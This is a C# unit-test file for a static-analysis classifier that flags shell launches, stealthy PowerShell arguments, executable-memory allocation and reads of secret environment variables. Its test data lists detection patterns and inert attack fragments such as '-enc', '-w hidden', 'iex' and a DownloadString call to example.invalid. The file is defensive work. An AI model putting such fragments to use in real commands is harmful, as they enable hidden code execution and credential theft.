namespace Silvergun.CodeAnalysis.IL.Tests;

using System;
using System.Collections.Generic;
using System.Linq;

using Silvergun.CodeAnalysis.IL;
using Silvergun.CodeAnalysis.IL.Ssa;

using Xunit;

/// <summary>
/// <see cref="SsaValueSignals.Of"/>, row by row of the table in docs/agent/tasks/recall-levers-1.md §2. Facts are built by hand:
/// the classifier is pure over a fact. Every string here is inert: the base64 is a run of "A"s, never a payload.
/// </summary>
public sealed class SsaValueSignalsTests
{
    #region Methods
    // ---- ShellInterpreter ------------------------------------------------------------------------------------------------

    [Theory]
    [InlineData("cmd")]
    [InlineData("cmd.exe")]
    [InlineData("CMD.EXE")]
    [InlineData("PowerShell.EXE")]
    [InlineData("pwsh")]
    [InlineData("bash")]
    [InlineData("bash.exe")]
    [InlineData("sh")]
    [InlineData("zsh")]
    [InlineData("wscript")]
    [InlineData("cscript.exe")]
    [InlineData("mshta")]
    [InlineData("rundll32.exe")]
    [InlineData("regsvr32")]
    [InlineData(@"C:\Windows\System32\cmd.exe")]
    [InlineData("/bin/bash")]
    [InlineData("/usr/bin/sh")]
    [InlineData("\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"")]
    [InlineData("  cmd.exe  ")]
    public void Shell_ProcessStartFile_Matches(string file) =>
        Assert.Equal([SsaSignal.ShellInterpreter], Of(Start(file)));

    [Theory]
    [InlineData("notepad.exe")]
    [InlineData("cmdx")]
    [InlineData("xcmd.exe")]
    [InlineData("shell")]
    [InlineData("cmd.dll")]
    [InlineData("")]
    [InlineData(@"C:\tools\")]
    public void Shell_OtherFile_DoesNotMatch(string file) =>
        Assert.Empty(Of(Start(file)));

    [Fact]
    public void Shell_ProcessStartInfoConstructorAndFileNameSetter_Match()
    {
        Assert.Equal([SsaSignal.ShellInterpreter], Of(Fact("System.Diagnostics.ProcessStartInfo..ctor", Str("cmd.exe"))));
        Assert.Equal([SsaSignal.ShellInterpreter], Of(Fact("System.Diagnostics.ProcessStartInfo.set_FileName", Str("cmd.exe"))));
    }

    // The file is argument 0 only.
    [Fact]
    public void Shell_ShellNameInTheArgumentsPosition_DoesNotMatch() =>
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("notepad.exe"), Str("cmd.exe"))));

    [Fact]
    public void Shell_OtherCalleeWithAShellName_DoesNotMatch()
    {
        Assert.Empty(Of(Fact("System.IO.File.ReadAllText", Str("cmd.exe"))));
        Assert.Empty(Of(Fact("System.Diagnostics.Process.GetProcessesByName", Str("cmd"))));
        Assert.Empty(Of(Fact("System.Diagnostics.ProcessStartInfo.set_WorkingDirectory", Str("cmd"))));
    }

    [Fact]
    public void Shell_OneOf_MatchesWhenAnyAlternativeDoes() =>
        Assert.Equal([SsaSignal.ShellInterpreter], Of(Fact("System.Diagnostics.Process.Start", OneOf(Str("notepad.exe"), Str("cmd.exe")))));

    [Fact]
    public void Shell_OneOfOfNoShell_DoesNotMatch() =>
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", OneOf(Str("a.exe"), Str("b.exe")))));

    // ---- StealthArguments ------------------------------------------------------------------------------------------------

    [Theory]
    [InlineData("-enc " + B64)]
    [InlineData("-EncodedCommand " + B64)]
    [InlineData("-ec " + B64)]
    [InlineData("-e " + B64)]
    [InlineData("-ENC " + B64)]
    [InlineData("-NoProfile -NonInteractive -enc " + B64 + " -x")]
    [InlineData("-enc   " + B64)]
    [InlineData("-w hidden")]
    [InlineData("-W HIDDEN -nop")]
    [InlineData("-WindowStyle Hidden")]
    [InlineData("-windowstyle  hidden -File x.ps1")]
    [InlineData("-ExecutionPolicy Bypass")]
    [InlineData("-exec bypass")]
    [InlineData("-EXEC BYPASS -File x.ps1")]
    [InlineData("iex")]
    [InlineData("IEX $x")]
    [InlineData("-c iex(x)")]
    [InlineData("Invoke-Expression $x")]
    [InlineData("(New-Object Net.WebClient).DownloadString('http://example.invalid/x')")]
    [InlineData("(New-Object Net.WebClient).DownloadFile('http://example.invalid/x','y')")]
    [InlineData("-command DOWNLOADSTRING")]
    public void Stealth_ProcessStartArguments_Matches(string arguments) =>
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.Process.Start", Str("tool.exe"), Str(arguments))));

    [Theory]
    [InlineData("-enc QUFB")]                      // a short run is not a payload
    [InlineData("-enc " + Short15)]                // one under 16
    [InlineData("-enc")]
    [InlineData("-extra " + B64)]                 // -e is a whole word
    [InlineData("--enc " + B64)]
    [InlineData("x-enc " + B64)]
    [InlineData("-w normal")]
    [InlineData("-w hiddenly")]
    [InlineData("-ExecutionPolicy RemoteSigned")]
    [InlineData("-exec bypassed")]
    [InlineData("iexplore.exe")]
    [InlineData("pixiex")]
    [InlineData("iex_x")]
    [InlineData("-iex")]
    [InlineData("invoke-expressions")]
    [InlineData("downloadstrings")]
    [InlineData("download")]
    [InlineData("--version")]
    [InlineData("")]
    public void Stealth_OtherArguments_DoNotMatch(string arguments) =>
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("tool.exe"), Str(arguments))));

    [Fact]
    public void Stealth_ExactlySixteenBase64Chars_Matches_FifteenDoNot()
    {
        Assert.Equal([SsaSignal.StealthArguments], Of(Start("x", "-enc " + new string('A', 16))));
        Assert.Empty(Of(Start("x", "-enc " + new string('A', 15))));
    }

    [Fact]
    public void Stealth_ConstructorArgumentOne_AndArgumentsSetterArgumentZero_Match()
    {
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.ProcessStartInfo..ctor", Str("x.exe"), Str("-w hidden"))));
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.ProcessStartInfo.set_Arguments", Str("-w hidden"))));
    }

    // The file's position is not read for arguments, nor the arguments' for the file.
    [Fact]
    public void Stealth_InTheFilePosition_DoesNotMatch()
    {
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("-w hidden"))));
        Assert.Empty(Of(Fact("System.Diagnostics.ProcessStartInfo.set_FileName", Str("-w hidden"))));
        Assert.Empty(Of(Fact("System.Diagnostics.ProcessStartInfo.set_WorkingDirectory", Str("-w hidden"))));
    }

    [Fact]
    public void Stealth_OneOf_MatchesWhenAnyAlternativeDoes() =>
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.Process.Start", Str("x.exe"), OneOf(Str("-v"), Str("-w hidden")))));

    [Fact]
    public void ShellAndStealth_OnOneSite_AreBothGivenInEnumOrder() =>
        Assert.Equal([SsaSignal.ShellInterpreter, SsaSignal.StealthArguments], Of(Start("powershell.exe", "-w hidden")));

    // Review W1: the worker escapes a tab, newline and return to \t, \n and \r. Windows splits a command line only on space and tab;
    // a newline or return matters inside a -Command script (a statement separator), and is read as a space there.
    // Inputs here are the escaped text, as the facts carry it.
    [Theory]
    [InlineData("-W" + Bs + "tHidden")]
    [InlineData("-WindowStyle" + Bs + "nHidden")]
    [InlineData("-exec" + Bs + "rbypass")]
    [InlineData("-Enc" + Bs + "t" + B64)]
    [InlineData("-nop;" + Bs + "niex(x)")]
    [InlineData("x" + Bs + "n" + "Invoke-Expression")]
    public void Stealth_EscapedTabNewlineReturn_ReadAsSpaces(string escaped) =>
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.Process.Start", Str("tool.exe"), Str(escaped))));

    // Read left to right: an escaped backslash followed by t is a backslash and a t, not a tab.
    [Theory]
    [InlineData("-w" + Bs + Bs + "thidden")]
    [InlineData("-enc" + Bs + Bs + "t" + B64)]
    [InlineData("-w" + Bs + Bs + "nhidden")]
    [InlineData("x" + Bs + Bs + "niex(x)")]
    [InlineData("C:" + Bs + Bs + "tools" + Bs + Bs + "x -w" + Bs + Bs + "rhidden")]
    public void Stealth_EscapedBackslashThenLetter_IsNotWhitespace(string escaped) =>
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("tool.exe"), Str(escaped))));

    // An escaped backslash and then a real escaped tab: the tab still separates.
    [Fact]
    public void Stealth_EscapedBackslashThenEscapedTab_StillSeparates() =>
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.Process.Start", Str("tool.exe"), Str("a" + Bs + Bs + " -w" + Bs + "thidden"))));

    // Review N2: arguments are argument 1 only of a two-argument call; Start(string, string, SecureString, string)'s is a user name.
    [Fact]
    public void Stealth_ArgumentOneOfAFourArgumentCall_IsNotTheArguments()
    {
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("tool.exe"), Str("-w hidden"), Str("x"), Str("y"))));
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("tool.exe"), Str("-w hidden"), Str("x"))));
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.Process.Start", Str("tool.exe"), Str("-w hidden"))));
        // Start(fileName, arguments, userName, password, domain): the second is the arguments (the user name may be null).
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.Process.Start", Str("tool.exe"), Str("-w hidden"), Null, Null, Null)));
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("tool.exe"), Str("-w hidden"), Str("x"), Str("y"), Str("z"), Str("w"))));
        // The file of the same four-argument call is still read.
        Assert.Equal([SsaSignal.ShellInterpreter], Of(Fact("System.Diagnostics.Process.Start", Str("cmd.exe"), Str("-w hidden"), Str("x"), Str("y"))));
    }

    // ---- ExecutableMemory ------------------------------------------------------------------------------------------------

    [Theory]
    [InlineData(0x10)]
    [InlineData(0x20)]
    [InlineData(0x40)]
    [InlineData(0x80)]
    [InlineData(0x140)]    // only the low byte is read: PAGE_EXECUTE_READWRITE | 0x100
    [InlineData(0x44)]
    public void Memory_VirtualAllocExecutableProtection_Matches(int protection) =>
        Assert.Equal([SsaSignal.ExecutableMemory], Of(Native("VirtualAlloc", Int(0), Int(4096), Int(0x3000), Int(protection))));

    [Theory]
    [InlineData(0x01)]
    [InlineData(0x02)]
    [InlineData(0x04)]
    [InlineData(0x08)]
    [InlineData(0x100)]
    [InlineData(0)]
    public void Memory_VirtualAllocNonExecutableProtection_DoesNotMatch(int protection) =>
        Assert.Empty(Of(Native("VirtualAlloc", Int(0), Int(4096), Int(0x3000), Int(protection))));

    // The protection's argument index per entry point: 3, 4, 2, 3.
    [Fact]
    public void Memory_ProtectionArgumentIndex_PerEntryPoint()
    {
        Assert.Equal([SsaSignal.ExecutableMemory], Of(Native("VirtualAllocEx", Int(0), Int(0), Int(4096), Int(0x3000), Int(0x40))));
        Assert.Equal([SsaSignal.ExecutableMemory], Of(Native("VirtualProtect", Int(0), Int(4096), Int(0x40), Int(0))));
        Assert.Equal([SsaSignal.ExecutableMemory], Of(Native("VirtualProtectEx", Int(0), Int(0), Int(4096), Int(0x40), Int(0))));
    }

    [Fact]
    public void Memory_ExecutableValueAtAnotherIndex_DoesNotMatch()
    {
        // VirtualProtect's index 3 is the old-protection out pointer, not the protection; VirtualAlloc's 2 is the type.
        Assert.Empty(Of(Native("VirtualProtect", Int(0), Int(4096), Int(0x04), Int(0x40))));
        Assert.Empty(Of(Native("VirtualAlloc", Int(0), Int(4096), Int(0x40), Int(0x04))));
        Assert.Empty(Of(Native("VirtualAllocEx", Int(0), Int(0), Int(4096), Int(0x40), Int(0x04))));
        Assert.Empty(Of(Native("VirtualProtectEx", Int(0), Int(0), Int(0x40), Int(0x04), Int(0))));
    }

    [Fact]
    public void Memory_OneOfProtections_MatchesWhenAnyAlternativeDoes()
    {
        Assert.Equal([SsaSignal.ExecutableMemory], Of(Native("VirtualAlloc", Int(0), Int(1), Int(2), OneOf(Int(4), Int(0x40)))));
        Assert.Empty(Of(Native("VirtualAlloc", Int(0), Int(1), Int(2), OneOf(Int(4), Int(2)))));
    }

    [Fact]
    public void Memory_OtherOrMissingImport_DoesNotMatch()
    {
        Assert.Empty(Of(Native("GetTickCount", Int(0), Int(1), Int(2), Int(0x40))));
        Assert.Empty(Of(Native("virtualalloc", Int(0), Int(1), Int(2), Int(0x40))));
        Assert.Empty(Of(Native("VirtualAlloc2", Int(0), Int(1), Int(2), Int(0x40))));
        Assert.Empty(Of(Native(null, Int(0), Int(1), Int(2), Int(0x40))));
    }

    [Fact]
    public void Memory_ProtectionNotAnIntConstant_DoesNotMatch()
    {
        Assert.Empty(Of(Native("VirtualAlloc", Int(0), Int(1), Int(2), SsaValue.OfParameter(0))));
        Assert.Empty(Of(Native("VirtualAlloc", Int(0), Int(1), Int(2), SsaValue.OfDynamic(SsaDynamicOrigin.CallResult))));
        Assert.Empty(Of(Native("VirtualAlloc", Int(0), Int(1), Int(2), Str("64"))));
        Assert.Empty(Of(Native("VirtualAlloc", Int(0), Int(1))));
    }

    // Review N1: an unsigned constant above long.MaxValue is written as its decimal; only its low byte is read.
    [Theory]
    [InlineData("18446744069414584384", true)]    // 0xFFFFFFFF00000040
    [InlineData("18446744073709551615", true)]    // ulong.MaxValue: 0xFF
    [InlineData("9223372036854775808", false)]    // 0x8000000000000000: low byte 0
    [InlineData("18446744069414584324", false)]   // 0xFFFFFFFF00000004
    [InlineData("-192", true)]                    // 0xFFFFFFFFFFFFFF40
    [InlineData("-256", false)]                   // 0xFFFFFFFFFFFFFF00: low byte 0
    public void Memory_LargeOrSignedIntProtection_IsReadByItsLowByte(string text, bool expected) =>
        Assert.Equal(expected, Of(Native("VirtualAlloc", Int(0), Int(4096), Int(0x3000), IntText(text))).Contains(SsaSignal.ExecutableMemory));

    // The worker's text is invariant: a culture that spells the minus sign otherwise must not change the reading.
    [Fact]
    public void Memory_IntText_IsParsedInvariant()
    {
        var before = System.Globalization.CultureInfo.CurrentCulture;
        try
        {
            System.Globalization.CultureInfo.CurrentCulture = new System.Globalization.CultureInfo("sv-SE");
            Assert.Equal([SsaSignal.ExecutableMemory], Of(Native("VirtualAlloc", Int(0), Int(4096), Int(0x3000), IntText("-192"))));
        }
        finally
        {
            System.Globalization.CultureInfo.CurrentCulture = before;
        }
    }

    [Theory]
    [InlineData("")]
    [InlineData("0x40")]
    [InlineData("64.0")]
    [InlineData("18446744073709551616")]   // one past ulong.MaxValue
    [InlineData(" 64")]
    public void Memory_UnparsableIntText_GivesNoSignal(string text) =>
        Assert.Empty(Of(Native("VirtualAlloc", Int(0), Int(4096), Int(0x3000), IntText(text))));

    // ---- SecretEnvironmentName -------------------------------------------------------------------------------------------

    [Theory]
    [InlineData("GITHUB_TOKEN")]
    [InlineData("github_token")]
    [InlineData("AWS_SECRET_ACCESS_KEY")]
    [InlineData("DB_PASSWORD")]
    [InlineData("MY_PASSWD")]
    [InlineData("ApiKey")]
    [InlineData("STRIPE_API_KEY")]
    [InlineData("ACCESS_KEY_ID")]
    [InlineData("SSH_PRIVATE_KEY")]
    [InlineData("CredentialStore")]
    [InlineData("xtokenx")]
    public void Secret_GetEnvironmentVariableOfASecretName_Matches(string name) =>
        Assert.Equal([SsaSignal.SecretEnvironmentName], Of(Fact("System.Environment.GetEnvironmentVariable", Str(name))));

    [Theory]
    [InlineData("PATH")]
    [InlineData("HOME")]
    [InlineData("USERNAME")]
    [InlineData("TOKE")]
    [InlineData("API_KE")]
    [InlineData("ACCESS_KE")]
    [InlineData("KEY")]
    [InlineData("")]
    public void Secret_OtherName_DoesNotMatch(string name) =>
        Assert.Empty(Of(Fact("System.Environment.GetEnvironmentVariable", Str(name))));

    [Fact]
    public void Secret_OtherCallee_DoesNotMatch()
    {
        Assert.Empty(Of(Fact("System.Environment.ExpandEnvironmentVariables", Str("%TOKEN%"))));
        Assert.Empty(Of(Fact("System.Environment.SetEnvironmentVariable", Str("TOKEN"), Str("x"))));
        Assert.Empty(Of(Fact("System.IO.File.ReadAllText", Str("TOKEN"))));
    }

    [Fact]
    public void Secret_OneOf_MatchesWhenAnyAlternativeDoes() =>
        Assert.Equal([SsaSignal.SecretEnvironmentName], Of(Fact("System.Environment.GetEnvironmentVariable", OneOf(Str("PATH"), Str("GITHUB_TOKEN")))));

    // ---- Cut, hash-only, not analysed, never throws --------------------------------------------------------------------

    // A cut constant is read on its kept prefix.
    [Fact]
    public void Cut_MatchesOnItsKeptPrefix()
    {
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.Process.Start", Str("x.exe"), Cut("-w hidden -File " + new string('a', 20), 900))));
        Assert.Equal([SsaSignal.SecretEnvironmentName], Of(Fact("System.Environment.GetEnvironmentVariable", Cut("GITHUB_TOKEN", 10))));
    }

    // Review W3: a cut file name is not whole ("cmd" may have been "cmd-helper.exe"), so it is never claimed to be a shell.
    [Theory]
    [InlineData("cmd")]
    [InlineData("cmd.exe")]
    [InlineData("C:/Windows/System32/powershell")]
    public void Cut_FileName_IsNeverAShell(string prefix)
    {
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Cut(prefix, 5000))));
        Assert.Equal([SsaSignal.ShellInterpreter], Of(Fact("System.Diagnostics.Process.Start", Str(prefix))));
    }

    // A cut argument text gets a word character after its prefix, so no word boundary is found at the cut.
    [Theory]
    [InlineData("-w hidden")]
    [InlineData("-WindowStyle Hidden")]
    [InlineData("-exec bypass")]
    [InlineData("x iex")]
    [InlineData("Invoke-Expression")]
    [InlineData("a.DownloadString")]
    public void Cut_RightAfterAWholeWord_GivesNoMatch(string prefix)
    {
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("x.exe"), Cut(prefix, 50))));
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.Process.Start", Str("x.exe"), Str(prefix))));
    }

    // The same prefixes with more kept after the word are matched as they stand.
    [Theory]
    [InlineData("-w hidden -File x.ps1")]
    [InlineData("iex (x)")]
    [InlineData("-enc " + B64)]
    public void Cut_KeepingAWholeMatch_StillMatches(string prefix) =>
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.Process.Start", Str("x.exe"), Cut(prefix, 50))));

    // A base64 run cut short of 16 chars is no payload, cut or not.
    [Fact]
    public void Cut_InsideTheBase64Run_GivesNoMatch() =>
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("x.exe"), Cut("-enc " + Short15, 50))));

    // What the cut dropped is not read: a prefix that stops mid-token does not match.
    [Fact]
    public void Cut_PrefixThatStopsMidToken_DoesNotMatch()
    {
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("x.exe"), Cut("-enc QUFBQUFB", 900))));
        Assert.Empty(Of(Fact("System.Environment.GetEnvironmentVariable", Cut("GITHUB_TOK", 10))));
    }

    [Fact]
    public void HashOnly_NeverMatches_NotEvenWhenTheWholeTextWould()
    {
        var shell = HashOnly("cmd.exe");
        var secret = HashOnly("GITHUB_TOKEN");
        var arguments = HashOnly("-w hidden");

        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", shell)));
        Assert.Empty(Of(Fact("System.Environment.GetEnvironmentVariable", secret)));
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str("x.exe"), arguments)));
    }

    // A text that only spells a suffix, but was not cut, is read whole.
    [Fact]
    public void UncutTextThatSpellsASuffix_IsReadWhole() =>
        Assert.Equal([SsaSignal.SecretEnvironmentName], Of(Fact("System.Environment.GetEnvironmentVariable", Str("TOKEN" + (char)0x2026 + "[+3 chars, sha256:01234567]"))));

    [Theory]
    [InlineData(SsaSiteStatus.MethodUnknown)]
    [InlineData(SsaSiteStatus.NotJoined)]
    [InlineData(SsaSiteStatus.NotRun)]
    public void NotAnalyzed_GivesNoSignal_EvenWithValuesPresent(SsaSiteStatus status) =>
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", [Str("cmd.exe"), Str("-w hidden")], status)));

    [Fact]
    public void NotConstantValues_GiveNoSignal()
    {
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", SsaValue.OfParameter(0), SsaValue.OfDynamic(SsaDynamicOrigin.CallResult))));
        Assert.Empty(Of(Fact("System.Environment.GetEnvironmentVariable", SsaValue.OfDynamic(SsaDynamicOrigin.TooManyAlternatives))));
        Assert.Empty(Of(Fact("System.Environment.GetEnvironmentVariable", new SsaValue(SsaValueKind.Constant, [new SsaConstant(SsaConstantKind.Null, "null")], null, null))));
        Assert.Empty(Of(Fact("System.Environment.GetEnvironmentVariable", new SsaValue(SsaValueKind.Constant, [new SsaConstant(SsaConstantKind.Type, "TOKEN")], null, null))));
    }

    [Fact]
    public void Of_IgnoresTheReceiver() =>
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", [], SsaSiteStatus.Analyzed, receiver: Str("cmd.exe"))));

    [Fact]
    public void Of_NoArguments_GivesNoSignal()
    {
        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start")));
        Assert.Empty(Of(Fact("System.Environment.GetEnvironmentVariable")));
    }

    [Theory]
    [InlineData("")]
    [InlineData(".")]
    [InlineData("..")]
    [InlineData("..ctor")]
    [InlineData(".ctor")]
    [InlineData("Start")]
    [InlineData("System.Diagnostics.Process.")]
    [InlineData("System.Diagnostics.Process")]
    public void Of_MalformedCalleeKey_DoesNotThrowAndGivesNoSignal(string key) =>
        Assert.Empty(Of(Fact(key, Str("cmd.exe"), Str("-w hidden"))));

    [Fact]
    public void Of_Null_DoesNotThrow() =>
        Assert.Empty(SsaValueSignals.Of(null!));

    [Fact]
    public void Of_HugeText_DoesNotThrow()
    {
        var huge = new string('e', 2_000_000);

        Assert.Empty(Of(Fact("System.Diagnostics.Process.Start", Str(huge), Str(huge))));
        Assert.Empty(Of(Fact("System.Environment.GetEnvironmentVariable", Str(huge))));
        Assert.Equal([SsaSignal.StealthArguments], Of(Fact("System.Diagnostics.Process.Start", Str("x"), Str(huge + " -w hidden"))));
    }

    [Fact]
    public void Of_IsDeterministic_AndEachSignalOnce()
    {
        var fact = Fact("System.Diagnostics.ProcessStartInfo..ctor", OneOf(Str("cmd"), Str("sh")), OneOf(Str("-w hidden"), Str("iex")));

        Assert.Equal([SsaSignal.ShellInterpreter, SsaSignal.StealthArguments], Of(fact));
        Assert.Equal(Of(fact), Of(fact));
    }

    // The enum's names are written to JSON and pinned: append-only.
    [Fact]
    public void Enum_IsAppendOnly() =>
        Assert.Equal(["ShellInterpreter", "StealthArguments", "ExecutableMemory", "SecretEnvironmentName"], Enum.GetNames<SsaSignal>());

    // ---- Helpers -------------------------------------------------------------------------------------------------------

    private static SsaSignal[] Of(SsaSinkFact fact) => [.. SsaValueSignals.Of(fact)];

    private static SsaSinkFact Start(string file, string? arguments = null) =>
        arguments is null ? Fact("System.Diagnostics.Process.Start", Str(file)) : Fact("System.Diagnostics.Process.Start", Str(file), Str(arguments));

    private static SsaSinkFact Native(string? import, params SsaValue[] arguments) =>
        Fact("Levers.Native.Anything", arguments, SsaSiteStatus.Analyzed, import);

    private static SsaSinkFact Fact(string calleeKey, params SsaValue[] arguments) =>
        Fact(calleeKey, arguments, SsaSiteStatus.Analyzed);

    private static SsaSinkFact Fact(string calleeKey, SsaValue[] arguments, SsaSiteStatus status, string? import = null, SsaValue? receiver = null) =>
        new(new SinkSite("N.M()", 0, MethodEdgeKind.Call, "N.C()", calleeKey, Capability.ProcessExecution), status,
            status == SsaSiteStatus.Analyzed ? receiver : null, arguments, arguments.Length, false, null, status == SsaSiteStatus.Analyzed ? null : "not analysed", null, import);

    private static SsaValue Str(string text) => SsaValue.OfConstant(new SsaConstant(SsaConstantKind.String, text));

    private static SsaValue Int(int value) => SsaValue.OfConstant(new SsaConstant(SsaConstantKind.Int, value.ToString(System.Globalization.CultureInfo.InvariantCulture)));

    private static SsaValue Null => SsaValue.OfConstant(new SsaConstant(SsaConstantKind.Null, "null"));

    private static SsaValue IntText(string text) => SsaValue.OfConstant(new SsaConstant(SsaConstantKind.Int, text));

    private static SsaValue OneOf(params SsaValue[] values) => new(SsaValueKind.OneOf, [.. values.Select(v => v.Constants[0])], null, null);

    // The kept prefix and the suffix a cut constant ends with; <paramref name="cutChars"/> chars were dropped.
    private static SsaValue Cut(string prefix, int cutChars) =>
        SsaValue.OfConstant(new SsaConstant(SsaConstantKind.String, prefix + UntrustedText.CutSuffix(prefix + new string('z', cutChars), cutChars), Cut: true));

    private static SsaValue HashOnly(string whole) =>
        SsaValue.OfConstant(new SsaConstant(SsaConstantKind.String, UntrustedText.HashOnly(whole), Cut: true));
    #endregion

    #region Fields
    // 24 chars of base64 ("AAAA…" with padding): inert, decodes to nothing.
    private const string Bs = "\\";

    private const string B64 = "QUFBQUFBQUFBQUFBQUFBQQ==";
    private const string Short15 = "QUFBQUFBQUFBQUF";
    #endregion
}
